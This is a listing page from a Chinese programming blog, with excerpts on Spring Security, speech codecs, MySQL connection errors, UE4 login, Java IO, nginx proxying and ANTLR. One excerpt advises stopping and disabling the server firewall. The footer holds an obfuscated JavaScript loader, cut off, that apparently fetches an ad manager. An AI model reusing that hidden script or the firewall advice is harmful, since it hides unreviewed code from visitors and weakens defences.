在认证环节，SS使用Authentication对象，封装了对安全主体的表示。此Authentication对象将作为SecurityContext中的重要组成部分，而SecurityContext正是作为SS为应用提供安全管理控制的上下文基础。应用怎么使用SecurityContext呢？SS提供了SecurityContextHolder来维护SecurityContext对象，以便应用中可以在一次用户级会话处理过程中随时可以使用安全上下文。用代码来反映以上这句话的意思如下：
Object principal = SecurityContextHolder.getContext().getAuthentication().getPrincipal(); if (principal instanceof UserDetails) { String username = ((UserDetails)principal).getUsername(); } else { String username = principal.toString(); } 这段代码中出现了要给听关键的东西UserDetails。这个接口可以看作是SS与应用业务中安全主体对象衔接的适配器。SS将会使用UserDetails来构造Authenticaiton，而应用也往往会将UserDetails转型为业务领域中的对应对象。那么接下来的问题是UserDetails是从哪里来的呢？SS中需要UserDetails的地方，都会需要UserDetailsService，这个服务仅有一个接口方法：
UserDetails loadUserByUsername(String username) throws UsernameNotFoundException; 总结以上概念，认证的逻辑基本如下：
UserDetailsService提供UserDetails，SS通过认证该信息后将其封装为Authenticaiton，这个Authentication会放在安全控制上下文对象中（SecurityConext），并由SecurityContextHolder进行管理。认证完毕后续的环节如果需要认证信息的话，就直接从SecurityContextHolder中取用即可。
在授权环节的基础是SecurityContextHolder的Authenticasiton除了包含主体信息外，还会包含其关联的权限信息。这些权限信息通常也都是通过UserDetailsService加载而来的。使用authentication.getAuthorities()得到主体现有权限，匹配安全对象所需的访问权限，若满足则给予授权放行，反之与之拒绝。
1.2 Spring Security的基本应用方法 SS为安全管理过程中的关键环节中的关键概念都进行了抽象定义，具体如何运用它，需要了解以下几个方面：
SS面向Java应用领域，提供安全管理；SS以AOP的方法来实施安全管理；由于SS解决的问题性质，它更多地体现为一种设计框架，而不是可以在其上可以直接构建业务的应用开发框架。使用SS需要对其一定程度的了解，复用的更多是其设计结构而不是代码黑箱。 这里主要说明在Java应用中进行安全管理的问题。从技术上来讲，Java领域中的可基于AOP进行有效安全访问控制的安全对象可以分为两种：“方法调用”和“Web请求调用”。而SS正是以 “around advice” 对 web request （servlet filter baseed）和 方法调用 （spring aop or aspectj based）来进行安全管理控制的。
这样以来对SS的应用方法就比较容易理解了：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fcd86022daff4f665feb327f22f3bccd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/126291fde4fa6ef334265f061f8f7307/" rel="bookmark">
			各种语音编码总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		speech codec (G.711, G.723, G.726, G.729, iLBC) 各种各样的编解码在各种领域得到广泛的应用，下面就把各种codec的压缩率进行一下比较，不正确之处望各位同行指正。 Speech codec： 现主要有的speech codec 有: G.711, G.723, G.726 , G.729, ILBC，QCELP, EVRC, AMR, SMV 主要的audiocodec 有: real audio, AAC,AC3, MP3, WMA, SBC等，各种编解码都有其应用的重点领域。 本文主要对speech codec相关指标进行总结： ITU 推出G.7XX系列的speechcodec, 目前广泛应用的有：G.711，G.723,G.726, G.729. 每一种又有很多分支，如G.729就有g.729A, g.729Band g.729AB G.711: G.711就是语音模拟信号的一种非线性量化，细分有二种:G.711 A-lawand G.711 u-law.不同的国家和地方都会选取一种作为自己的标准. G.711 bitrate 是64kbps. 详细的资料可以在ITU 上下到相关的spec，下面主要列出一些性能参数： G.711（PCM方式：PCM＝脉码调制 ：Pulse Code Modulation） • 采样率：8kHz • 信息量：64kbps／channel • 理论延迟：0.125msec • 品质：MOS值4.10 G.723.1: G.723.1是一个双速率的语音编码器，是 ITU-T建议的应用于低速率多媒体服务中语音或其它音频信号的压缩算法；其目标应用系统包括H.323、H.324等多媒体通信系统，目前该算法已成为IP电话系统中的必选算法之一；编码器的帧长为30ms，还有7.5ms的前瞻，编码器的算法时延为37.5ms；编码器首先对语音信号进行传统电话带宽的滤波（基于G.712），再对语音信号用传统8000-Hz速率进行抽样（基于G.711），并变换成16 bit线性PCM码作为该编码器的输入；在解码器中对输出进行逆操作来重构语音信号；高速率编码器使用多脉冲最大似然量化（MP-MLQ），低速率编码器使用代数码激励线性预测（ACELP）方法，编码器和解码器都必须支持此两种速率，并能够在帧间对两种速率进行转换；此系统同样能够对音乐和其他音频信号进行压缩和解压缩，但它对语音信号来说是最优的；采用了执行不连续传输的静音压缩，这就意味着在静音期间的比特流中加入了人为的噪声。除了预留带宽之外，这种技术使发信机的调制解调器保持连续工作，并且避免了载波信号的时通时断。 G.726: G.726有四种码率：, 32, 24, 16 kbit/s Adaptive Differential Pulse Code Modulation(ADPCM)，最为常用的方式是 32 kbit/s，但由于其只是 G.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/126291fde4fa6ef334265f061f8f7307/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a085bfac711fba6482be4459ed89354f/" rel="bookmark">
			连接MySQL错误:Can&#39;t connect to MySQL server (10060)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用图形界面管理工具Navicat for MySQL连接Mysql数据库时提示错误：Can't connect to MySQL server (10060)
问题原因：
导致些问题可能有以下几个原因：
1、网络不通；
2、服务未启动；
3、防火墙端口未开放；
解决方法：
启动服务：
service mysqld start; 经过分析，我遇到的这个问题是防火墙导致的！ 开放防火墙端口
添加需要监听的端口
/sbin/iptables -I INPUT -p tcp --dport 3306 -j ACCEPT
保存设置
/etc/init.d/iptables save
查看状态
/etc/init.d/iptables status
临时关闭防火墙服务
service iptables stop
开启防火墙服务
service iptables start
开机不再启动防火墙服务
chkconfig iptables off
注意：
此文档适用服务器环境为：CentOS 6.5 MySQL 5.6
如果是Java程序连接不上数据库，请参考：Connections could not be acquired from the underlying database
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/886cfebbe59c6c09572602bf31ae8d9b/" rel="bookmark">
			ue4 服务器登陆流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ue4中，客户端登陆流程如下，调用UEngine::Browse方法，在这个方法中，判断如果是客户端，则创建UPendingNetGame实例，代码如下：
WorldContext.PendingNetGame = NewObject&lt;UPendingNetGame&gt;(); WorldContext.PendingNetGame-&gt;Initialize(URL); WorldContext.PendingNetGame-&gt;InitNetDriver(); 而在InitNetDriver函数中，会向服务器发送 NMT_Hello 协议，我们转到NMT_Hello 的定义，如下：
DEFINE_CONTROL_CHANNEL_MESSAGE_TWOPARAM(Hello, 0, uint8, uint32); // initial client connection message 参数1：大端还是小端
参数2：客户端版本号
客户端处理协议的地方是如下两个函数：
void UPendingNetGame::NotifyControlMessage(UNetConnection* Connection, uint8 MessageType, class FInBunch&amp; Bunch) void UWorld::NotifyControlMessage(UNetConnection* Connection, uint8 MessageType, class FInBunch&amp; Bunch)服务器处理协议的地方是下面这个函数： void UWorld::NotifyControlMessage(UNetConnection* Connection, uint8 MessageType, class FInBunch&amp; Bunch) 在服务器的协议处理函数，我们可以看到NMT_Hello协议的处理过程，先调用Receive接收消息，然后判断版本号是否一致，不一致发送NMT_Upgrade消息，一致则发送NMT_Challenge消息
DEFINE_CONTROL_CHANNEL_MESSAGE_ONEPARAM(Challenge, 3, FString); // server sends client challenge string to verify integrity 参数1：服务器当前时间 客户端收到NMT_Challenge消息后，向服务器发送NMT_Login消息，NMT_Login消息携带三个参数，如下：
DEFINE_CONTROL_CHANNEL_MESSAGE_THREEPARAM(Login, 5, FString, FString, FUniqueNetIdRepl); // client requests to be admitted to the game参数1：客户端响应 参数2：客户端URL 参数3：客户端唯一ID 服务器收到NMT_Login消息，验证是否可以登录，失败返回NMT_Failure消息，成功则向服务器发送NMT_Welcome消息
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/886cfebbe59c6c09572602bf31ae8d9b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2564a8e3f9f34ee10df21333bde1bf91/" rel="bookmark">
			java--IO流基本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1:递归 (1)方法定义中调用方法本身的现象 举例：老和尚给小和尚讲故事，我们学编程 (2)递归的注意事项； A:要有出口，否则就是死递归 B:次数不能过多，否则内存溢出 C:构造方法不能递归使用 (3)递归的案例： A:递归求阶乘 B:兔子问题 C:递归输出指定目录下所有指定后缀名的文件绝对路径 D:递归删除带内容的目录(小心使用) 2:IO流(掌握) (1)IO用于在设备间进行数据传输的操作 (2)分类： A:流向 输入流 读取数据 输出流 写出数据 B:数据类型 字节流 字节输入流 字节输出流 字符流 字符输入流 字符输出流 注意： a:如果我们没有明确说明按照什么分，默认按照数据类型分。 b:除非文件用windows自带的记事本打开我们能够读懂，才采用字符流，否则建议使用字节流。 (3)FileOutputStream写出数据 A:操作步骤 a:创建字节输出流对象 b:调用write()方法 c:释放资源 B:代码体现： FileOutputStream fos = new FileOutputStream("fos.txt"); fos.write("hello".getBytes()); fos.close(); C:要注意的问题? a:创建字节输出流对象做了几件事情? b:为什么要close()? c:如何实现数据的换行? d:如何实现数据的追加写入? (4)FileInputStream读取数据 A:操作步骤 a:创建字节输入流对象 b:调用read()方法 c:释放资源 B:代码体现： FileInputStream fis = new FileInputStream("fos.txt"); //方式1 int by = 0; while((by=fis.read())!=-1) { System.out.print((char)by); } //方式2 byte[] bys = new byte[1024]; int len = 0; while((len=fis.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2564a8e3f9f34ee10df21333bde1bf91/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43afcbca2e80db5cf629e4b682b3c33e/" rel="bookmark">
			java.net.SocketException: Connection reset问题解决总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决办法：
1、网络编程时未正确捕获java.net.SocketException, 客户端先关闭就会报这个异常;（检查发送数据是否符合服务器接收格式，不然的话服务器会自动断开连接，这样，socket就会被关闭，那么你就不能使用IO流读取数据，这样就会报这个错误） 2、数据库和应用服务器的网段不同（这个查看一下，可能性较小） 3、好像说防火墙的比较多。。。。（试一下，关闭） 4、大部分是网络的原因。提交post的东西多，然后服务器接收就超时了（这个只能说一般可能性较小）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd022bd3e73f542b555bef2f6d4febbf/" rel="bookmark">
			通过nginx反向代理,Tomcat获取真实的客户端IP而非服务器IP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过nginx反向代理，就获取不到真实ip，是获取的nginx的ip，要得到真实的IP要进行配置Nginx的配置文件： nginx.conf
proxy_set_header X-Real-IP $remote_addr;
例如：
######################################################################## #要转发地域名： upstream t.csdn.com { server 192.168.1.188:8080 max_fails=0 weight=1; #8080为tomcat端口 } ################################################################## server { listen 80; server_name t.csdn.com; access_log /data/wwwlogs/access_tomcat.log combined; root /usr/local/tomcat/webapps; index index.html index.jsp; #反向代理配置，将所有请求为http://hostname的请求全部转发到upstream中定义的目标服务器中。 location / { #此处配置的域名必须与upstream的域名一致，才能转发。 proxy_pass http://t.csdn.com; proxy_set_header X-Real-IP $remote_addr; } #启用nginx status 监听页面 location /nginxstatus { stub_status on; access_log on; } } 然后Tomcat 的获取方式： java private static String getRemoteAddrIp(HttpServletRequest request) { String ipFromNginx = getHeader(request, "X-Real-IP"); log.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd022bd3e73f542b555bef2f6d4febbf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aea0856dc81273b620c0719d6363f2e4/" rel="bookmark">
			实现fresco的DraweeView的图片手势缩放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实现fresco的DraweeView的图片手势缩放 代码请转github：实现fresco的DraweeView的图片手势缩放
fresco可以配合PhotoView实现图片缩放，网上看到有两种方法：
修改photoview
https://github.com/ongakuer/PhotoDraweeView
继承photoview，自定义DraweeView
https://github.com/biezhihua/MySimpleDraweeView
fresco项目里面也有关于手势缩放的官方实现，详情见github： https://github.com/facebook/fresco/tree/master/samples/zoomable/src/main/java/com/facebook/samples/zoomable
这里介绍直接使用ScaleGestureDetector进行手势缩放检测的方法。 这种方法实现起来比较简单。
直接上代码：
package com.nd.buddhist.ui.widget; import android.content.Context; import android.graphics.Bitmap; import android.graphics.Canvas; import android.graphics.Matrix; import android.graphics.RectF; import android.net.Uri; import android.util.AttributeSet; import android.view.GestureDetector; import android.view.MotionEvent; import android.view.ScaleGestureDetector; import com.facebook.drawee.view.SimpleDraweeView; /** * @author DragonJiang * @Date 2016/5/10 * @Time 11:12 * @description */ public class ZoomableDraweeView extends SimpleDraweeView { private ScaleGestureDetector mScaleDetector; private GestureDetector mGestureDetector; private float mCurrentScale = 1f; private Matrix mCurrentMatrix; private float mMidX; private float mMidY; private OnClickListener mClickListener; public ZoomableDraweeView(Context context) { super(context); init(); } public ZoomableDraweeView(Context context, AttributeSet attrs) { super(context, attrs); init(); } public ZoomableDraweeView(Context context, AttributeSet attrs, int defStyle) { super(context, attrs, defStyle); init(); } private void init() { mCurrentMatrix = new Matrix(); ScaleGestureDetector.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aea0856dc81273b620c0719d6363f2e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad4400cb76800640a3e55782123b75bf/" rel="bookmark">
			Linux常用操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux命令 ls 显示当前目录下的文件信息
mkdir 建立目录
mv 移动文件或者重命名文件
cp 复制文件或者目录（-r）
rm 删除文件或目录（-r）
cd 进入目录
. 当前目录
chown 给用户授权，如chown ossuser:ossgroup ./test.sh chmod 改变文件或者目录的访问权限，如chmod 775 ./test.sh
cat 查看文件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30a1917ada9cabb7e3b3b3a13764701d/" rel="bookmark">
			hadoop2.6在window上搭建测试环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决Exception: org.apache.hadoop.io.nativeio.NativeIO$Windows.access0(Ljava/lang/String;I)Z 等一系列问题，ljavalangstring 一．简介
Windows下的 Eclipse上调试Hadoop2代码，所以我们在windows下的Eclipse配置hadoop-eclipse-plugin-2.6.0.jar插件，并在运行Hadoop代码时出现了一系列的问题，搞了好几天终于能运行起代码。接下来我们来看看问题并怎么解决，提供给跟我同样遇到的问题作为参考。
Hadoop2的WordCount.java统计代码如下：
import java.io.IOException; import java.util.StringTokenizer; import org.apache.hadoop.conf.Configuration; import org.apache.hadoop.fs.Path; import org.apache.hadoop.io.IntWritable; import org.apache.hadoop.io.Text; import org.apache.hadoop.mapreduce.Job; import org.apache.hadoop.mapreduce.Mapper; import org.apache.hadoop.mapreduce.Reducer; import org.apache.hadoop.mapreduce.lib.input.FileInputFormat; import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat; public class WordCount { public static class TokenizerMapper extends Mapper&lt;Object, Text, Text, IntWritable&gt;{ private final static IntWritable one = new IntWritable(1); private Text word = new Text(); public void map(Object key, Text value, Context context ) throws IOException, InterruptedException { StringTokenizer itr = new StringTokenizer(value.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30a1917ada9cabb7e3b3b3a13764701d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7695a9adfe10ad38676f3f9cf96a8f85/" rel="bookmark">
			mysql数据库表清空后id如何从1开始自增
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境：
数据库：mysql
我们的数据库表中经常会使用id自增，但是每次清空表后id并不是从1开始计数，总是接着之前的进行自增，那么解决呢？
使用mysql的truncate命令，用法：truncate table 表名;
这样表的id自增就会变回从1开始自增了。
备注：该操作会清空您宝贵的数据库，我想题目已经说的够清楚了，请谨慎操作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4702fa078b59ad2358849f02a63758e6/" rel="bookmark">
			类 Properties
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Properties 类表示了一个持久的属性集。Properties 可保存在流中或从流中加载。属性列表中每个键及其对应值都是一个字符串。 一个属性列表可包含另一个属性列表作为它的“默认值”；如果未能在原有的属性列表中搜索到属性键，则搜索第二个属性列表。 因为 Properties 继承于 Hashtable，所以可对 Properties 对象应用 put 和 putAll 方法。但不建议使用这两个方法，因为它们允许调用者插入其键或值不是 String 的项。相反，应该使用 setProperty 方法。如果在“不安全”的 Properties 对象（即包含非 String 的键或值）上调用 store 或 save 方法，则该调用将失败。类似地，如果在“不安全”的 Properties 对象（即包含非 String 的键）上调用 propertyNames 或 list 方法，则该调用将失败。 load(Reader) / store(Writer, String) 方法按下面所指定的、简单的面向行的格式在基于字符的流中加载和存储属性。除了输入/输出流使用 ISO 8859-1 字符编码外，load(InputStream) / store(OutputStream, String) 方法与 load(Reader)/store(Writer, String) 对的工作方式完全相同。可以使用 Unicode 转义来编写此编码中无法直接表示的字符；转义序列中只允许单个 'u' 字符。可使用 native2ascii 工具对属性文件和其他字符编码进行相互转换。 loadFromXML(InputStream) 和 storeToXML(OutputStream, String, String) 方法按简单的 XML 格式加载和存储属性。默认使用 UTF-8 字符编码，但如果需要，可以指定某种特定的编码。XML 属性文档具有以下 DOCTYPE 声明 &lt;!DOCTYPE properties SYSTEM "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4702fa078b59ad2358849f02a63758e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/742328be056cec8bca13ceccbc51f239/" rel="bookmark">
			sip呼叫里SDP的一些字段的含义
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		v=0
o=- 1 0 IN IP4 164.135.25.51 #local ip ，即本机SIP信令交互地址
s=SNS call #用于传递会话主题
c=IN IP4 164.135.25.51 #media ip ， 即接收RTP流的媒体地址，不一定是本机地址
t=0 0 #会话时间，一般由其它信令控制，故填0
m=audio 30254 RTP/AVP 0# 音频接收端口（必须为偶数） /表示音频通过RTP传输 /0表示允许音频的格式（见下一行“a=”）
a=rtpmap:0 PCMU/8000 #0为RTP头，说明接允许收音频格式的代号为0，8000表示音频采样率
a=sendrecv m=video 30186 RTP/AVP 122 123 # 视频接收端口（必须为偶数） /视频通过RTP传输 /122,123表示允许视频的格式为122,123
a=rtpmap:122 H264/90000 #122 为视频流代号，/9000 表示视频流的pts的单位为1/90000
a=fmtp:122 profile-level-id=64E01F; max-br=1152 #64E01F表示编码参数为 high profile, level 31 ，最大码率为1152kbps
a=rtpmap:123 H264/90000
a=fmtp:123 profile-level-id=42E01F; max-br=1152 #42E01F表示编码参数为 main profile, level 12 ，最大码率为1152kbps
a=sendrecv
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/742328be056cec8bca13ceccbc51f239/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e79a52f4134e2bd02d4119f743700385/" rel="bookmark">
			python logging 日志轮转文件不删除问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 最近在维护项目的python项目代码，项目使用了 python 的日志模块 logging， 设定了保存的日志数目， 不过没有生效，还要通过contab定时清理数据。
分析 项目使用了 logging 的 TimedRotatingFileHandler ：
1 #!/user/bin/env python 2 # -*- coding: utf-8 -*- 3 4 import logging 5 from logging.handlers import TimedRotatingFileHandler 6 log = logging.getLogger() 7 file_name = "./test.log" 8 logformatter = logging.Formatter('%(asctime)s [%(levelname)s]|%(message)s') 9 loghandle = TimedRotatingFileHandler(file_name, 'midnight', 1, 2) 10 loghandle.setFormatter(logformatter) 11 loghandle.suffix = '%Y%m%d' 12 log.addHandler(loghandle) 13 log.setLevel(logging.DEBUG) 14 15 log.debug("init successful") 参考 python logging 的官方文档：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e79a52f4134e2bd02d4119f743700385/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/522aa1959c9a738f1f6de180d9d5783d/" rel="bookmark">
			ANTLR v4学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于毕设会使用到ANTLR这个工具来实现一个关于出租车领域指标计算的语言，所以就开始学习ANTR这个工具，使用的是ANTLR4，做一些简单的翻译和体会的记录吧。 ANTLR是一个强大的语法生成器，你可以使用它来阅读，处理，执行或者翻译结构化的文本或者二进制文件。它在研究和工程中被广泛使用，来建立各种语言、工具和框架。 ANTLR自动为你所描述的语言创建语法树，用来展示输入的语句如何与语法匹配，并且自动生成语法树的追踪器用来对树的节点执行特定的代码。 为了实现一门语言，我们需要建立一个可以读句子并且对于输入的符号和短语有正确的反应的应用程序。如果应用程序是计算并执行语句，我们称之为解释器，例如计算器，配置文件读取器，Python解释器。如果我们只是将句子从一种语言转换为另一种语言，我们称之为编译器，例如java到C#的转换器和编译器。为了准确的反应，解释器和编译器必须识别某一特定语言所有合法的句子（sentence），词组（phrase），字词组（subphrase）。识别一个词组（phrase）意味着我们可以定义不同的组分并且加以区别。识别之后，应用程序需要进行正确的操作。 识别语言的程序叫做解析器或者语法分析器。语法是指管理语言的成员的规则，我们通过建立ANTLR的语法文件去指定语言的语法。一个语法文件是规则的集合，每一个规则表示一个词组（phrase）的结构。语法文件本身需要遵循一种语言的语法：ANTLR的元语言。 如果我们把解析分成两个相似但是功能不同的阶段，会变得容易许多。这两个分开的阶段反应了我们大脑阅读文本时的情景。首先是将字符流处理成一个个的单词，这被称为词法分析（lexical analysis），我们可以将做词法分析的程序为词法分析器（lexer）。词法分析器可以讲相关的单词组成一个单词类型，例如INT、ID、FLOAT等。词法分析器将单词标以类型后，语法分析器只需关注类型。 其次则是通过一系列单词识别句子的结构，被称为语法分析。ANTLR语法分析器建立了一个数据结构，被称为语法树，来记录语法分析器如何识别一个输入语句的结构以及句子的短语组分，如图 所示。 通过建立语法树，语法分析器通过语法树这样便利的数据结构向程序传递语法分析器是如何将单词组成一个个的词组的信息。需要识别相同语言的不同的应用程序可以复用语法树。语法树对于需要编译多遍的编译器也是十分便利的。 同时，ANTLR通过在语法文件中加入属性（attributes）和动作（actions）来支持将程序代码直接集成在语法文件中，直接在语法分析时完成。 ANTLR工具通过语法规则生成一个递归下降的语法分析器（recursive-descent parsers）。递归下降的语法分析器是一个递归方法的集合，解析过程则是从根开始向叶子递归。在解析时， 当一个规则存在多个选项时，则需要检查接下来输入的一个或者多个单词来做出预测判断，在规则的多个选项中选择一个，这样的工作由ANTLR自动完成。 ANTLR在它的运行库中提供了两种树的遍历机制（tree-walking mechanisms）。默认情况下，ANTLR生成一个语法树的监听器（Listener）来响应遍历语法树触发的事件。监听器是自动按照深度优先完成树的遍历，我们只需完成在每个节点需要触发的各种事件；而访问器（visitor）提供了可控的遍历方式，我们自行控制遍历，决定是否调用子结点的访问方法。由于本课题使用了监听器的方式来实现，所以详细阐述监听器的机制。 语法树监听器（Parse Tree Listener） 为了能够遍历语法树并在监听器中触发事件的调用，ANTLR的运行时提供了一个类ParseTreeWalker。在语言的应用程序中，我们创建ParseTreeListener类的子类来包含应用程序特定的代码。ANTLR为每一个条规则生成一个进入和退出的方法，当遍历进入到这个节点是会触发进入的方法，当遍历完这个节点所有的子节点后，会触发退出的方法。监听器的机制为会自动完成语法树的遍历，无需再写语法树的遍历过程，监听器会提供一个类，包含每个规则的输入输出函数，我们只需继承这个类并复写这些函数即可。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/545/">«</a>
	<span class="pagination__item pagination__item--current">546/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/547/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,